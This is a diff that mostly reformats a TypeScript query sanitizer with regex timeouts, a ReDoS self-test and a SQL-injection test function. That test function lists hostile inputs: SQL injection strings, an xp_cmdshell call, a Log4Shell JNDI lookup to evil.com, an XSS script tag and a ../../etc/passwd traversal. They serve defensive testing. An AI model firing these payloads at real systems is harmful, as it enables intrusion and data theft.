@@ -61,7 +61,10 @@ const SECURITY_CONFIG: SecurityConfig = {
  * Provides secure regex execution with timeout and monitoring
  */
 class SafeRegexExecutor {
-  private static executionStats: Map<string, { count: number; totalTime: number; failures: number }> = new Map();
+  private static executionStats: Map<
+    string,
+    { count: number; totalTime: number; failures: number }
+  > = new Map();
 
   /**
    * Execute regex with timeout protection
@@ -78,7 +81,11 @@ class SafeRegexExecutor {
     try {
       // Set up timeout
       const timeoutId = setTimeout(() => {
-        const stats = this.executionStats.get(patternName) || { count: 0, totalTime: 0, failures: 0 };
+        const stats = this.executionStats.get(patternName) || {
+          count: 0,
+          totalTime: 0,
+          failures: 0,
+        };
         stats.failures++;
         this.executionStats.set(patternName, stats);
       }, timeoutMs);
@@ -110,12 +117,15 @@ class SafeRegexExecutor {
   /**
    * Get execution statistics
    */
-  static getStats(): Map<string, { count: number; totalTime: number; failures: number; avgTime: number }> {
+  static getStats(): Map<
+    string,
+    { count: number; totalTime: number; failures: number; avgTime: number }
+  > {
     const result = new Map();
     for (const [pattern, stats] of this.executionStats) {
       result.set(pattern, {
         ...stats,
-        avgTime: stats.count > 0 ? stats.totalTime / stats.count : 0
+        avgTime: stats.count > 0 ? stats.totalTime / stats.count : 0,
       });
     }
     return result;
@@ -141,7 +151,10 @@ function validateInput(input: string): { valid: boolean; warnings: string[] } {
 
   // Check length
   if (input.length > SECURITY_CONFIG.max_input_length) {
-    return { valid: false, warnings: [`Input too long: ${input.length} > ${SECURITY_CONFIG.max_input_length}`] };
+    return {
+      valid: false,
+      warnings: [`Input too long: ${input.length} > ${SECURITY_CONFIG.max_input_length}`],
+    };
   }
 
   // Check character set
@@ -174,17 +187,19 @@ const SAFE_PATTERN_DETECTION: SafePatternDetection[] = [
     pattern: /\bT\d{1,6}-T\d{1,6}\b/g,
     name: 'task_id_range',
     handler: (input: string) => {
-      return SafeRegexExecutor.executeWithTimeout(
-        /\bT\d{1,6}-T\d{1,6}\b/g,
-        input,
-        (regex, str) => str.replace(regex, (match) => match.replace(/-/g, ' ')),
-        20
-      ) || input;
+      return (
+        SafeRegexExecutor.executeWithTimeout(
+          /\bT\d{1,6}-T\d{1,6}\b/g,
+          input,
+          (regex, str) => str.replace(regex, (match) => match.replace(/-/g, ' ')),
+          20
+        ) || input
+      );
     },
     description: 'Convert task ID ranges to space-separated format',
     max_execution_time: 20,
     complexity_score: 2,
-    safe_alternative: 'simple_whitespace_normalization'
+    safe_alternative: 'simple_whitespace_normalization',
   },
 
   // Version/Phase numbers: Phase-2 → Phase 2 (SAFE: non-capturing groups, bounded)
@@ -192,17 +207,19 @@ const SAFE_PATTERN_DETECTION: SafePatternDetection[] = [
     pattern: /\b(?:Phase|Version|Release)\s{0,3}-\s{0,3}(\d{1,3})/gi,
     name: 'version_numbers',
     handler: (input: string) => {
-      return SafeRegexExecutor.executeWithTimeout(
-        /\b(?:Phase|Version|Release)\s{0,3}-\s{0,3}(\d{1,3})/gi,
-        input,
-        (regex, str) => str.replace(regex, (match) => match.replace(/\s*-\s*/, ' ')),
-        25
-      ) || input;
+      return (
+        SafeRegexExecutor.executeWithTimeout(
+          /\b(?:Phase|Version|Release)\s{0,3}-\s{0,3}(\d{1,3})/gi,
+          input,
+          (regex, str) => str.replace(regex, (match) => match.replace(/\s*-\s*/, ' ')),
+          25
+        ) || input
+      );
     },
     description: 'Normalize version/phase number formatting',
     max_execution_time: 25,
     complexity_score: 3,
-    safe_alternative: 'simple_hyphen_replacement'
+    safe_alternative: 'simple_hyphen_replacement',
   },
 
   // Multiple hyphenated phrases (SAFE: limited whitespace, simple)
@@ -210,17 +227,19 @@ const SAFE_PATTERN_DETECTION: SafePatternDetection[] = [
     pattern: /[a-zA-Z]\s{0,3}-\s{0,3}[a-zA-Z]/g,
     name: 'hyphenated_words',
     handler: (input: string) => {
-      return SafeRegexExecutor.executeWithTimeout(
-        /[a-zA-Z]\s{0,3}-\s{0,3}[a-zA-Z]/g,
-        input,
-        (regex, str) => str.replace(regex, (match) => match[0] + ' ' + match[match.length - 1]),
-        15
-      ) || input;
+      return (
+        SafeRegexExecutor.executeWithTimeout(
+          /[a-zA-Z]\s{0,3}-\s{0,3}[a-zA-Z]/g,
+          input,
+          (regex, str) => str.replace(regex, (match) => `${match[0]} ${match[match.length - 1]}`),
+          15
+        ) || input
+      );
     },
     description: 'Convert hyphenated words to spaces',
     max_execution_time: 15,
     complexity_score: 3,
-    safe_alternative: 'simple_hyphen_replacement'
+    safe_alternative: 'simple_hyphen_replacement',
   },
 
   // Common typos - double letters (SAFE: bounded repetition)
@@ -228,17 +247,19 @@ const SAFE_PATTERN_DETECTION: SafePatternDetection[] = [
     pattern: /\b([a-zA-Z])\1{2,4}([a-zA-Z])\b/g,
     name: 'double_letters',
     handler: (input: string) => {
-      return SafeRegexExecutor.executeWithTimeout(
-        /\b([a-zA-Z])\1{2,4}([a-zA-Z])\b/g,
-        input,
-        (regex, str) => str.replace(regex, '$1$2'),
-        10
-      ) || input;
+      return (
+        SafeRegexExecutor.executeWithTimeout(
+          /\b([a-zA-Z])\1{2,4}([a-zA-Z])\b/g,
+          input,
+          (regex, str) => str.replace(regex, '$1$2'),
+          10
+        ) || input
+      );
     },
     description: 'Fix excessive repeated letters',
     max_execution_time: 10,
     complexity_score: 2,
-    safe_alternative: 'no_op'
+    safe_alternative: 'no_op',
   },
 
   // Special character removal (SAFE: aggressive SQL injection prevention)
@@ -246,17 +267,19 @@ const SAFE_PATTERN_DETECTION: SafePatternDetection[] = [
     pattern: /[^\w\s.,!?-]+/g,
     name: 'special_chars',
     handler: (input: string) => {
-      return SafeRegexExecutor.executeWithTimeout(
-        /[^\w\s.,!?-]+/g,
-        input,
-        (regex, str) => str.replace(regex, ''),
-        10
-      ) || input;
+      return (
+        SafeRegexExecutor.executeWithTimeout(
+          /[^\w\s.,!?-]+/g,
+          input,
+          (regex, str) => str.replace(regex, ''),
+          10
+        ) || input
+      );
     },
     description: 'Remove problematic special characters including SQL injection vectors',
     max_execution_time: 10,
     complexity_score: 1,
-    safe_alternative: 'no_op'
+    safe_alternative: 'no_op',
   },
 
   // SQL injection specific pattern removal
@@ -264,17 +287,19 @@ const SAFE_PATTERN_DETECTION: SafePatternDetection[] = [
     pattern: /['";\\-]+/g,
     name: 'sql_injection_chars',
     handler: (input: string) => {
-      return SafeRegexExecutor.executeWithTimeout(
-        /['";\\-]+/g,
-        input,
-        (regex, str) => str.replace(regex, ''),
-        10
-      ) || input;
+      return (
+        SafeRegexExecutor.executeWithTimeout(
+          /['";\\-]+/g,
+          input,
+          (regex, str) => str.replace(regex, ''),
+          10
+        ) || input
+      );
     },
     description: 'Remove SQL injection characters',
     max_execution_time: 10,
     complexity_score: 1,
-    safe_alternative: 'no_op'
+    safe_alternative: 'no_op',
   },
 
   // Simple whitespace normalization (SAFE: bounded quantifier)
@@ -282,18 +307,20 @@ const SAFE_PATTERN_DETECTION: SafePatternDetection[] = [
     pattern: /\s{1,10}/g,
     name: 'whitespace_normalization',
     handler: (input: string) => {
-      return SafeRegexExecutor.executeWithTimeout(
-        /\s{1,10}/g,
-        input,
-        (regex, str) => str.replace(regex, ' '),
-        5
-      ) || input;
+      return (
+        SafeRegexExecutor.executeWithTimeout(
+          /\s{1,10}/g,
+          input,
+          (regex, str) => str.replace(regex, ' '),
+          5
+        ) || input
+      );
     },
     description: 'Normalize whitespace',
     max_execution_time: 5,
     complexity_score: 1,
-    safe_alternative: 'manual_whitespace_fix'
-  }
+    safe_alternative: 'manual_whitespace_fix',
+  },
 ];
 
 /**
@@ -388,7 +415,7 @@ export function sanitizeQuery(
         'double_letters',
         'special_chars',
         'sql_injection_chars',
-        'whitespace_normalization'
+        'whitespace_normalization',
       ],
       auto_fixes_applied,
       security_warnings
@@ -462,11 +489,15 @@ function applySafePatternDetections(
 
           // Warn if execution took too long
           if (executionTime > detection.max_execution_time) {
-            security_warnings.push(`${detection.name} took ${executionTime}ms (limit: ${detection.max_execution_time}ms)`);
+            security_warnings.push(
+              `${detection.name} took ${executionTime}ms (limit: ${detection.max_execution_time}ms)`
+            );
           }
         }
       } catch (error) {
-        security_warnings.push(`Pattern ${detection.name} failed: ${error instanceof Error ? error.message : 'Unknown error'}`);
+        security_warnings.push(
+          `Pattern ${detection.name} failed: ${error instanceof Error ? error.message : 'Unknown error'}`
+        );
         // Use safe alternative if available
         if (detection.safe_alternative === 'simple_hyphen_replacement') {
           cleaned = cleaned.replace(/-/g, ' ');
@@ -490,7 +521,25 @@ export function extractCoreKeywordsSafe(query: string, maxWords: number = 5): st
   }
 
   const stopWords = [
-    'the', 'a', 'an', 'and', 'or', 'but', 'in', 'on', 'at', 'to', 'for', 'of', 'with', 'by', 'as', 'is', 'was', 'are', 'were',
+    'the',
+    'a',
+    'an',
+    'and',
+    'or',
+    'but',
+    'in',
+    'on',
+    'at',
+    'to',
+    'for',
+    'of',
+    'with',
+    'by',
+    'as',
+    'is',
+    'was',
+    'are',
+    'were',
   ];
 
   // Safe split with timeout protection
@@ -565,7 +614,10 @@ export function suggestSanitizationLevel(query: string): SanitizationLevel {
   } catch (error) {
     // If pattern detection fails, be conservative
     if (SECURITY_CONFIG.enable_monitoring) {
-      console.warn('Pattern detection failed in suggestSanitizationLevel, using basic level:', error);
+      console.warn(
+        'Pattern detection failed in suggestSanitizationLevel, using basic level:',
+        error
+      );
     }
     return 'basic';
   }
@@ -596,7 +648,7 @@ export function isLikelyToCauseTsqueryError(query: string): boolean {
       10
     );
 
-    return (problematicCharsResult === true) || (taskIdResult === true);
+    return problematicCharsResult === true || taskIdResult === true;
   } catch (error) {
     // If error occurs, be conservative
     return true;
@@ -607,7 +659,14 @@ export function isLikelyToCauseTsqueryError(query: string): boolean {
  * Generate user-friendly feedback message (SECURE version)
  */
 export function generateSanitizationFeedback(result: SanitizationResult): string {
-  const { original, cleaned, transformations, auto_fixes_applied, patterns_detected, security_warnings } = result;
+  const {
+    original,
+    cleaned,
+    transformations,
+    auto_fixes_applied,
+    patterns_detected,
+    security_warnings,
+  } = result;
 
   if (transformations.length === 0 && security_warnings.length === 0) {
     return 'Query contains no problematic characters.';
@@ -653,7 +712,9 @@ export function generateSanitizationOptions(query: string): {
       level: 'basic',
       patterns_detected: [],
       auto_fixes_applied: [],
-      security_warnings: [`Sanitization failed: ${error instanceof Error ? error.message : 'Unknown error'}`],
+      security_warnings: [
+        `Sanitization failed: ${error instanceof Error ? error.message : 'Unknown error'}`,
+      ],
     };
 
     return {
@@ -671,7 +732,10 @@ export function generateSanitizationOptions(query: string): {
 /**
  * Get regex execution statistics for monitoring
  */
-export function getRegexExecutionStats(): Map<string, { count: number; totalTime: number; failures: number; avgTime: number }> {
+export function getRegexExecutionStats(): Map<
+  string,
+  { count: number; totalTime: number; failures: number; avgTime: number }
+> {
   return SafeRegexExecutor.getStats();
 }
 
@@ -692,21 +756,21 @@ export function testRedosResistance(): {
 } {
   const attackPatterns = [
     // Nested quantifier attacks
-    'a'.repeat(100) + 'b',
-    'a'.repeat(200) + 'b',
-    'a'.repeat(500) + 'b',
+    `${'a'.repeat(100)}b`,
+    `${'a'.repeat(200)}b`,
+    `${'a'.repeat(500)}b`,
 
     // Alternation attacks
-    'a' + '|'.repeat(50) + 'b',
-    'x' + '|'.repeat(100) + 'y',
+    `a${'|'.repeat(50)}b`,
+    `x${'|'.repeat(100)}y`,
 
     // Backreference attacks
     'a'.repeat(50) + 'a'.repeat(50),
     'b'.repeat(100) + 'b'.repeat(100),
 
     // Complex mixed attacks
-    'T' + '0'.repeat(50) + '-T' + '0'.repeat(50),
-    'Phase' + ' '.repeat(50) + '-' + ' '.repeat(50) + '123',
+    `T${'0'.repeat(50)}-T${'0'.repeat(50)}`,
+    `Phase${' '.repeat(50)}-${' '.repeat(50)}123`,
   ];
 
   const results = [];
@@ -717,14 +781,14 @@ export function testRedosResistance(): {
     let passed = false;
 
     try {
-      const result = sanitizeQuery(input, 'moderate');
+      sanitizeQuery(input, 'moderate');
       const executionTime = Date.now() - startTime;
       passed = executionTime < 100; // Should complete within 100ms
 
       results.push({
         input: input.substring(0, 50) + (input.length > 50 ? '...' : ''),
         passed,
-        executionTime
+        executionTime,
       });
 
       totalTime += executionTime;
@@ -733,13 +797,13 @@ export function testRedosResistance(): {
       results.push({
         input: input.substring(0, 50) + (input.length > 50 ? '...' : ''),
         passed: false,
-        executionTime
+        executionTime,
       });
       totalTime += executionTime;
     }
   }
 
-  const passedCount = results.filter(r => r.passed).length;
+  const passedCount = results.filter((r) => r.passed).length;
   const failedCount = results.length - passedCount;
 
   return {
@@ -748,8 +812,8 @@ export function testRedosResistance(): {
     summary: {
       passed: passedCount,
       failed: failedCount,
-      totalTime
-    }
+      totalTime,
+    },
   };
 }
 
@@ -767,11 +831,11 @@ export function verifySqlInjectionPrevention(): {
     "admin'/**/OR/**/1=1#",
     "'; INSERT INTO logs VALUES ('hacked'); --",
     "1' UNION SELECT * FROM passwords --",
-    "${jndi:ldap://evil.com/a}",
+    '${jndi:ldap://evil.com/a}',
     "<script>alert('xss')</script>",
-    "../../etc/passwd",
+    '../../etc/passwd',
     "' AND 1=CONVERT(int, (SELECT @@version)) --",
-    "'; EXEC xp_cmdshell('dir'); --"
+    "'; EXEC xp_cmdshell('dir'); --",
   ];
 
   const results = [];
@@ -780,13 +844,14 @@ export function verifySqlInjectionPrevention(): {
   for (const injection of injectionAttempts) {
     try {
       const result = sanitizeQuery(injection, 'aggressive');
-      const containsInjection = result.cleaned.includes("'") ||
-                              result.cleaned.includes(";") ||
-                              result.cleaned.includes("--") ||
-                              result.cleaned.toLowerCase().includes('select') ||
-                              result.cleaned.toLowerCase().includes('drop') ||
-                              result.cleaned.toLowerCase().includes('insert') ||
-                              result.cleaned.toLowerCase().includes('union');
+      const containsInjection =
+        result.cleaned.includes("'") ||
+        result.cleaned.includes(';') ||
+        result.cleaned.includes('--') ||
+        result.cleaned.toLowerCase().includes('select') ||
+        result.cleaned.toLowerCase().includes('drop') ||
+        result.cleaned.toLowerCase().includes('insert') ||
+        result.cleaned.toLowerCase().includes('union');
 
       if (!containsInjection) {
         blockedCount++;
@@ -795,15 +860,15 @@ export function verifySqlInjectionPrevention(): {
       results.push({
         input: injection,
         sanitized: result.cleaned,
-        containsInjection
+        containsInjection,
       });
     } catch (error) {
       // If sanitization fails, count as blocked
       blockedCount++;
       results.push({
         input: injection,
-        sanitized: "[SANITIZATION_ERROR]",
-        containsInjection: false
+        sanitized: '[SANITIZATION_ERROR]',
+        containsInjection: false,
       });
     }
   }
@@ -813,6 +878,6 @@ export function verifySqlInjectionPrevention(): {
   return {
     testCases: injectionAttempts,
     results,
-    effectiveness
+    effectiveness,
   };
 }
